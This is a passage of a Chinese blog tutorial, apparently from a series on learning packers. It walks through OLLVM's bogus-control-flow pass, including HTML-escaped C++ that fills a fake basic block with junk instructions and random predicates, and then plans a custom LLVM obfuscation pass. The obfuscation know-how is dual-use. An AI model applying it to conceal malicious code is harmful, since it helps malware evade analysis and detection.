&lt;span class="n">op&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">BinaryOperator&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">Create&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Instruction&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">Mul&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">op1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">getOperand&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="s">&amp;#34;gen&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;*&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="n">op&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">BinaryOperator&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">Create&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Instruction&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">Shl&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">getOperand&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">getOperand&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">var&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;*&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// Binary float
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">opcode&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">Instruction&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">FAdd&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="n">opcode&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">Instruction&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">FSub&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="n">opcode&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">Instruction&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">FMul&lt;/span> &lt;span class="o">||&lt;/span>
&lt;span class="n">opcode&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">Instruction&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">FDiv&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="n">opcode&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">Instruction&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">FRem&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">random&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">llvm&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">cryptoutils&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">get_range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="n">random&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">10&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="o">++&lt;/span>&lt;span class="n">random&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">switch&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">llvm&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">cryptoutils&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">get_range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="c1">// can be improved
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">case&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="c1">// do nothing
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="n">op2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">UnaryOperator&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">CreateFNeg&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">getOperand&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">var&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;*&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">op1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">BinaryOperator&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">Create&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Instruction&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">FAdd&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">op2&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">getOperand&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="s">&amp;#34;gen&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;*&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="n">op&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">BinaryOperator&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">Create&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Instruction&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">FSub&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">getOperand&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">getOperand&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">var&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;*&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">op1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">BinaryOperator&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">Create&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Instruction&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">FMul&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">op&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">getOperand&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="s">&amp;#34;gen&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;*&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">opcode&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">Instruction&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">ICmp&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="c1">// Condition (with int)
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">ICmpInst&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">currentI&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">ICmpInst&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">switch&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">llvm&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">cryptoutils&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">get_range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="c1">// must be improved
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">case&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="c1">// do nothing
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="n">currentI&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">swapOperands&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="c1">// randomly change the predicate
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">switch&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">llvm&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">cryptoutils&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">get_range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="n">currentI&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">setPredicate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ICmpInst&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">ICMP_EQ&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// equal
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">case&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="n">currentI&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">setPredicate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ICmpInst&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">ICMP_NE&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// not equal
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">case&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="n">currentI&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">setPredicate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ICmpInst&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">ICMP_UGT&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// unsigned greater than
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">case&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="n">currentI&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">setPredicate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ICmpInst&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">ICMP_UGE&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// unsigned greater or equal
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">case&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="n">currentI&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">setPredicate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ICmpInst&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">ICMP_ULT&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// unsigned less than
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">case&lt;/span> &lt;span class="mi">5&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="n">currentI&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">setPredicate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ICmpInst&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">ICMP_ULE&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// unsigned less or equal
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">case&lt;/span> &lt;span class="mi">6&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="n">currentI&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">setPredicate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ICmpInst&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">ICMP_SGT&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// signed greater than
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">case&lt;/span> &lt;span class="mi">7&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="n">currentI&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">setPredicate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ICmpInst&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">ICMP_SGE&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// signed greater or equal
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">case&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="n">currentI&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">setPredicate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ICmpInst&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">ICMP_SLT&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// signed less than
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">case&lt;/span> &lt;span class="mi">9&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="n">currentI&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">setPredicate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ICmpInst&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">ICMP_SLE&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// signed less or equal
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="p">}&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">opcode&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">Instruction&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">FCmp&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="c1">// Conditions (with float)
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">FCmpInst&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">currentI&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">FCmpInst&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">switch&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">llvm&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">cryptoutils&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">get_range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="c1">// must be improved
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">case&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="c1">// do nothing
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="n">currentI&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">swapOperands&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="c1">// randomly change the predicate
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">switch&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">llvm&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">cryptoutils&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">get_range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="n">currentI&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">setPredicate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">FCmpInst&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">FCMP_OEQ&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// ordered and equal
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">case&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="n">currentI&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">setPredicate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">FCmpInst&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">FCMP_ONE&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// ordered and operands are unequal
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">case&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="n">currentI&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">setPredicate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">FCmpInst&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">FCMP_UGT&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// unordered or greater than
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">case&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="n">currentI&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">setPredicate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">FCmpInst&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">FCMP_UGE&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// unordered, or greater than, or equal
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">case&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="n">currentI&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">setPredicate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">FCmpInst&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">FCMP_ULT&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// unordered or less than
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">case&lt;/span> &lt;span class="mi">5&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="n">currentI&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">setPredicate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">FCmpInst&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">FCMP_ULE&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// unordered, or less than, or equal
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">case&lt;/span> &lt;span class="mi">6&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="n">currentI&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">setPredicate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">FCmpInst&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">FCMP_OGT&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// ordered and greater than
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">case&lt;/span> &lt;span class="mi">7&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="n">currentI&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">setPredicate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">FCmpInst&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">FCMP_OGE&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// ordered and greater than or equal
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">case&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="n">currentI&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">setPredicate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">FCmpInst&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">FCMP_OLT&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// ordered and less than
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">case&lt;/span> &lt;span class="mi">9&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="n">currentI&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">setPredicate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">FCmpInst&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">FCMP_OLE&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// ordered or less than, or equal
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="p">}&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">alteredBB&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="c1">// end of createAlteredBasicBlock()
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>主要是分两部分：&lt;/p>
&lt;ol>
&lt;li>复制原始块，并修复伪造块的调试信息与元数据&lt;/li>
&lt;li>在伪造块中寻找二元运算、浮点运算、比较指令，在其中插入垃圾指令。&lt;/li>
&lt;/ol>
&lt;h2 id="0x03-创建自己的混淆">0x03 创建自己的混淆&lt;/h2>
&lt;p>对 OLLVM 的 bcf 混淆有了初步的映像之后，接下来就可以依样画葫芦抄一个自己的混淆出来啦。&lt;/p>
&lt;h3 id="31-方案">3.1 方案&lt;/h3>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/learning-packer-08/image-20211103105527721.png"
width="953"
height="726"
srcset="https://nnnewb.github.io/blog/blog/p/learning-packer-08/image-20211103105527721_huf9cff02c3a79573b2f021a9808299ab4_137978_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/learning-packer-08/image-20211103105527721_huf9cff02c3a79573b2f021a9808299ab4_137978_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20211103105527721"
class="gallery-image"
data-flex-grow="131"
data-flex-basis="315px"
>&lt;/p>
&lt;p>作为概念验证，我们的 pass 将原始代码分割成三个基本块，称为 &lt;code>entry&lt;/code>、&lt;code>original&lt;/code>和&lt;code>terminator&lt;/code>。&lt;code>entry&lt;/code> 通过一个恒真判断跳转至 &lt;code>original&lt;/code>，&lt;code>original&lt;/code> 通过恒真判断跳转至 &lt;code>terminator&lt;/code>。伪造块 &lt;code>altered&lt;/code> 则是 false 分支，内容仅复制 &lt;code>original&lt;/code> 块，并在末尾跳转至 &lt;code>original&lt;/code> 块。&lt;/p>
&lt;p>伪造块应该永远不会被执行。&lt;/p>
&lt;h3 id="32-llvm编程的重要概念">3.2 LLVM编程的重要概念&lt;/h3>
&lt;p>参考文章：&lt;a class="link" href="https://mukulrathi.com/create-your-own-programming-language/llvm-ir-cpp-api-tutorial/" target="_blank" rel="noopener"
>LLVM IR C++ API Tutorial&lt;/a>&lt;/p>
&lt;h4 id="关键类型">关键类型：&lt;/h4>
&lt;p>清单如下：&lt;/p>
&lt;ul>
&lt;li>&lt;code>Value&lt;/code>&lt;/li>
&lt;li>&lt;code>Module&lt;/code>&lt;/li>
&lt;li>&lt;code>Type&lt;/code>&lt;/li>
&lt;li>&lt;code>Function&lt;/code>&lt;/li>
&lt;li>&lt;code>BasicBlock&lt;/code>&lt;/li>
&lt;li>&lt;code>BranchInst&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>列出的这些是 LLVM C++ 接口定义的类，可以通过 &lt;code>Module&lt;/code> 获取 &lt;code>Function&lt;/code>，可以从 &lt;code>Function&lt;/code> 获取 &lt;code>BasicBlock&lt;/code>，也可以从 &lt;code>BasicBlock&lt;/code> 反过来获取 &lt;code>Function&lt;/code>，这些容器间组织成层级关系。&lt;/p>
&lt;p>&lt;code>Module&lt;/code>-&amp;gt;&lt;code>Function&lt;/code>-&amp;gt;&lt;code>BasicBlock&lt;/code>-&amp;gt;&lt;code>Instruction&lt;/code>&lt;/p>
&lt;p>&lt;code>Value&lt;/code> 是公共基类，&lt;code>Function&lt;/code>、&lt;code>BasicBlock&lt;/code>，包括各种指令类都是从&lt;code>Value&lt;/code>继承。&lt;/p>
&lt;h4 id="phinode">PHINode：&lt;/h4>
&lt;p>参考文章：&lt;a class="link" href="http://mayuyu.io/2018/06/04/PhiNode-in-LLVM/" target="_blank" rel="noopener"
>PhiNode in LLVM&lt;/a>&lt;/p>
